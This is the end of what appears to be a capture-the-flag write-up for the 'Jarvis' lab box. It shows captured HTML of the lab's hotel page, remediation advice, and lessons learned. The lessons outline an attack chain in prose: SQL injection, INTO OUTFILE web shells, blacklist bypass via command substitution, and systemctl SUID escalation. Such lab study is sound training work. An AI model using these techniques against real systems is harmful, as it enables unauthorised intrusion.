										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
								</div>
							</div>
						</div>
					</div>
				</li>
				<li style="background-image: url(images/img_bg_4.jpg);">
					<div class="overlay"></div>
					<div class="container-fluid">
						<div class="row">
							<div class="col-md-6 col-sm-12 col-md-offset-3 slider-text">
								<div class="slider-text-inner text-center">
									<h2>Come &amp; enjoy the unforgetable nights</h2>
									<h1>In the heart of Stark Hotel</h1>
										<p><a class="btn btn-primary btn-demo" href="#"></i> View Detail</a> <a class="btn btn-primary btn-learn">Know More</a></p>
								</div>
							</div>
						</div>
					</div>
				</li>
				</ul>
			</div>
		</aside>
		<div id="colorlib-services">
			<div class="container">
				<div class="row">
					<div class="col-md-3 animate-box text-center">
						<div class="services">
							<span class="icon">
								<i class="flaticon-reception"></i>
							</span>
							<h3>24/7 Front Desk</h3>
							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
						</div>
					</div>
					<div class="col-md-3 animate-box text-center">
						<div class="services">
							<span class="icon">
								<i class="flaticon-herbs"></i>
							</span>
							<h3>Spa Suites</h3>
							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
						</div>
					</div>
					<div class="col-md-3 animate-box text-center">
						<div class="services">
							<span class="icon">
								<i class="flaticon-car"></i>
							</span>
							<h3>Transfer Services</h3>
							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
						</div>
					</div>
					<div class="col-md-3 animate-box text-center">
						<div class="services">
							<span class="icon">
								<i class="flaticon-cheers"></i>
							</span>
							<h3>Restaurant &amp; Bar</h3>
							<p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. A small river named Duden flows by their place and supplies</p>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div id="colorlib-rooms" class="colorlib-light-grey">
			<div class="container">
				<div class="row">
					<div class="col-md-6 col-md-offset-3 text-center colorlib-heading animate-box">
						<span><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i></span>
						<h2>Rooms &amp; Suites</h2>
						<p>We love to tell our successful far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
					</div>
				</div>
				<div class="row">
					<div class="col-md-12 animate-box">
						<div class="owl-carousel owl-carousel2">
              <div class="item">
								<a href="/images/room-6.jpg" class="room image-popup-link" style="background-image: url(/images/room-6.jpg);"></a>
								<div class="desc text-center">
									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
									<h3><a href="/room.php?cod=1">Superior Family Room</a></h3>
									<p class="price">
										<span class="currency">$</span>
										<span class="price-room">270</span>
										<span class="per">/ per night</span>
									</p>
									<ul>
										<li><i class="icon-check"></i> Perfect for traveling couples</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
									</ul>
									<p><a href="room.php?cod=1" class="btn btn-primary btn-book">Book now!</a></p>
								</div>
							</div><div class="item">
								<a href="/images/room-1.jpg" class="room image-popup-link" style="background-image: url(/images/room-1.jpg);"></a>
								<div class="desc text-center">
									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i></span>
									<h3><a href="/room.php?cod=2">Suite</a></h3>
									<p class="price">
										<span class="currency">$</span>
										<span class="price-room">149</span>
										<span class="per">/ per night</span>
									</p>
									<ul>
										<li><i class="icon-check"></i> Only 10 rooms are available</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
									</ul>
									<p><a href="room.php?cod=2" class="btn btn-primary btn-book">Book now!</a></p>
								</div>
							</div><div class="item">
								<a href="/images/room-2.jpg" class="room image-popup-link" style="background-image: url(/images/room-2.jpg);"></a>
								<div class="desc text-center">
									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
									<h3><a href="/room.php?cod=3">Double Room</a></h3>
									<p class="price">
										<span class="currency">$</span>
										<span class="price-room">199</span>
										<span class="per">/ per night</span>
									</p>
									<ul>
										<li><i class="icon-check"></i> Perfect for traveling couples</li>		<li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
									</ul>
									<p><a href="room.php?cod=3" class="btn btn-primary btn-book">Book now!</a></p>
								</div>
							</div><div class="item">
								<a href="/images/room-3.jpg" class="room image-popup-link" style="background-image: url(/images/room-3.jpg);"></a>
								<div class="desc text-center">
									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
									<h3><a href="/room.php?cod=4">Family Room</a></h3>
									<p class="price">
										<span class="currency">$</span>
										<span class="price-room">249</span>
										<span class="per">/ per night</span>
									</p>
									<ul>
										<li><i class="icon-check"></i> Two double beds</li><li><i class="icon-check"></i> Babysitting facilities</li><li><i class="icon-check"></i> 1 free bed available on request</li>
									</ul>
									<p><a href="room.php?cod=4" class="btn btn-primary btn-book">Book now!</a></p>
								</div>
							</div><div class="item">
								<a href="/images/room-4.jpg" class="room image-popup-link" style="background-image: url(/images/room-4.jpg);"></a>
								<div class="desc text-center">
									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
									<h3><a href="/room.php?cod=5">Classic Double Room</a></h3>
									<p class="price">
										<span class="currency">$</span>
										<span class="price-room">179</span>
										<span class="per">/ per night</span>
									</p>
									<ul>
										<li><i class="icon-check"></i> Only 10 rooms are available</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
									</ul>
									<p><a href="room.php?cod=5" class="btn btn-primary btn-book">Book now!</a></p>
								</div>
							</div><div class="item">
								<a href="/images/room-6.jpg" class="room image-popup-link" style="background-image: url(/images/room-6.jpg);"></a>
								<div class="desc text-center">
									<span class="rate-star"><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full full"></i><i class="icon-star-full"></i></span>
									<h3><a href="/room.php?cod=6">Superior Family Room</a></h3>
									<p class="price">
										<span class="currency">$</span>
										<span class="price-room">360</span>
										<span class="per">/ per night</span>
									</p>
									<ul>
										<li><i class="icon-check"></i> Perfect for traveling couples</li><li><i class="icon-check"></i> Breakfast included</li><li><i class="icon-check"></i> Price does not include VAT &amp; services fee</li>
									</ul>
									<p><a href="room.php?cod=6" class="btn btn-primary btn-book">Book now!</a></p>
								</div>
							</div>
						</div>
					</div>
					<div class="col-md-12 text-center animate-box">
						<a href="rooms-suites.php">View all rooms <i class="icon-arrow-right3"></i></a>
					</div>
				</div>
			</div>
		</div>


		<div id="colorlib-dining-bar">
			<div class="container">
				<div class="row">
					<div class="col-md-6 col-md-offset-3 text-center colorlib-heading animate-box">
						<span><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i><i class="icon-star-full"></i></span>
						<h2>Dining &amp; Bar</h2>
						<p>We love to tell our successful far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
					</div>
				</div>
				<div class="row">
					<div class="diningbar-flex">
						<div class="half animate-box">
							<ul class="nav nav-tabs text-center" role="tablist">
								<li role="presentation" class="active"><a href="#mains" aria-controls="mains" role="tab" data-toggle="tab">Mains</a></li>
								<li role="presentation"><a href="#desserts" aria-controls="desserts" role="tab" data-toggle="tab">Desserts</a></li>
								<li role="presentation"><a href="#drinks" aria-controls="drinks" role="tab" data-toggle="tab">Drinks</a></li>
							</ul>
			            <!-- Tab panes -->
			            <div class="tab-content">
								<div role="tabpanel" class="tab-pane active" id="mains">
									<div class="row">
										<div class="col-md-12">
											<ul class="menu-dish">
							              <li>
							                <figure class="image"><img src="images/menu-1.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$25.99</span>
							                  <h3>Grilled Pork</h3>
							                  <p class="cat">Meat / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-2.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$30.99</span>
							                  <h3>Tuna Roast Source</h3>
							                  <p class="cat">Tuna / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$40.00</span>
							                  <h3>Roast Beef (4 sticks)</h3>
							                  <p class="cat">Crab / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-4.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$20.50</span>
							                  <h3>Salted Fried Chicken</h3>
							                  <p class="cat">Crab / Potatoes / Rice</p>
							                </div>
							              </li>
							            </ul>
										</div>
									</div>
								</div>

								<div role="tabpanel" class="tab-pane" id="desserts">
									<div class="row">
										<div class="col-md-12">
											<ul class="menu-dish">
							              <li>
							                <figure class="image"><img src="images/menu-1.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$39.90</span>
							                  <h3>Fried Potatoes with Garlic</h3>
							                  <p class="cat">Viggies / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$20.99</span>
							                  <h3>Tuna Roast Source</h3>
							                  <p class="cat">Tuna / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$50.00</span>
							                  <h3>Roast Beef (4 sticks)</h3>
							                  <p class="cat">Crab / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-4.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$29.00</span>
							                  <h3>Salted Fried Chicken</h3>
							                  <p class="cat">Crab / Potatoes / Rice</p>
							                </div>
							              </li>
							            </ul>
										</div>
									</div>
								</div>

								<div role="tabpanel" class="tab-pane" id="drinks">
									<div class="row">
										<div class="col-md-12">
											<ul class="menu-dish">
							              <li>
							                <figure class="image"><img src="images/menu-8.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$25.00</span>
							                  <h3>Fried Potatoes with Garlic</h3>
							                  <p class="cat">Viggies / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-9.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$20.50</span>
							                  <h3>Tuna Roast Source</h3>
							                  <p class="cat">Tuna / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-3.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$30.00</span>
							                  <h3>Roast Beef (4 sticks)</h3>
							                  <p class="cat">Crab / Potatoes / Rice</p>
							                </div>
							              </li>
							              <li>
							                <figure class="image"><img src="images/menu-4.jpg" alt="Free Bootstrap Template by colorlib.com"></figure>
							                <div class="text">
							                  <span class="price">$29.99</span>
							                  <h3>Salted Fried Chicken</h3>
							                  <p class="cat">Crab / Potatoes / Rice</p>
							                </div>
							              </li>
							            </ul>
										</div>
									</div>
								</div>
			            </div>
			         </div><!-- end half -->
			         <div class="half diningbar-img" style="background-image: url(images/cover_img_1.jpg);"></div><!-- end half -->
			      </div>
			   </div>
	      </div>
		</div>



		<footer id="colorlib-footer" role="contentinfo">
			<div class="container">
				<div class="row row-pb-md">
					<div class="col-md-3 colorlib-widget">
						<h4>	<title>Stark Hotel</title></h4>
						<p>Luxury hotel where you can feel cool although in reality you are a fool</p>
						<p>
							<ul class="colorlib-social-icons">
								<li><a href="#"><i class="icon-twitter"></i></a></li>
								<li><a href="#"><i class="icon-facebook"></i></a></li>
								<li><a href="#"><i class="icon-linkedin"></i></a></li>
								<li><a href="#"><i class="icon-dribbble"></i></a></li>
							</ul>
						</p>
					</div>
					<div class="col-md-3 colorlib-widget">
						<h4>Quick Links</h4>
						<p>
							<ul class="colorlib-footer-links">
								<li><a href="#">Dining &amp; Bar</a></li>
							</ul>
						</p>
					</div>
					<div class="col-md-3 col-md-push-1">
						<h4>Contact Information</h4>
						<ul class="colorlib-footer-links">
							<li>291 South 21th Street, <br> Suite 721 New York NY 10016</li>
							<li><a href="#">+ 1235 2355 98</a></li>
							<li><a href="#">supersecurehotel@logger.htb</a></li>
							<li><a href="#">supersecurehotel.htb</a></li>
						</ul>
					</div>
				</div>
				<div class="row">
					<div class="col-md-12 text-center">
						<p>
							<small class="block">
Copyright &copy;<script>document.write(new Date().getFullYear());</script>
						</p>
					</div>
				</div>
			</div>
		</footer>
	</div>

	<div class="gototop js-top">
		<a href="#" class="js-gotop"><i class="icon-arrow-up2"></i></a>
	</div>

	<!-- jQuery -->
	<script src="js/jquery.min.js"></script>
	<!-- jQuery Easing -->
	<script src="js/jquery.easing.1.3.js"></script>
	<!-- Bootstrap -->
	<script src="js/bootstrap.min.js"></script>
	<!-- Waypoints -->
	<script src="js/jquery.waypoints.min.js"></script>
	<!-- Flexslider -->
	<script src="js/jquery.flexslider-min.js"></script>
	<!-- Owl carousel -->
	<script src="js/owl.carousel.min.js"></script>
	<!-- Magnific Popup -->
	<script src="js/jquery.magnific-popup.min.js"></script>
	<script src="js/magnific-popup-options.js"></script>
	<!-- Date Picker -->
	<script src="js/bootstrap-datepicker.js"></script>
	<!-- Main -->
	<script src="js/main.js"></script>

	</body>
</html>
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Jarvis | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- A numeric parameter can still be UNION injectable; compare true and false responses instead of relying on error messages.
- INTO OUTFILE is a direct path from database access to PHP execution when the database account has FILE privilege and the web root is writable.
- A blacklist that omits shell syntax such as command substitution does not make os.system() safe.
- SUID enumeration should include unusual administrative binaries, not only common shells and file utilities.
- A systemctl editor escape can work even when the standard temporary-unit method fails on an older systemd version.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- manual SQLi and MySQL INTO OUTFILE produced a web shell.
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- web command execution led to a sudo transition and SUID Bash.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- a low-privilege Linux shell used a writable or missing sudo path to create a SUID Bash helper.
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web command injection produced a Linux foothold followed by focused local escalation.

## External resources

- [HackTricks -- SQL injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [GTFOBins -- systemctl](https://gtfobins.org/gtfobins/systemctl/)
- [RevShells](https://www.revshells.com/)

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Jarvis combines three reusable OSCP habits: manually proving SQL injection before escalating it to code execution, reading the exact source behind a sudo-allowed script, and treating unusual SUID administrative binaries as privilege-escalation candidates. The WAF delay and failed systemd unit route also reinforce the value of low-noise enumeration and recording failure conditions instead of repeating a non-working path blindly.
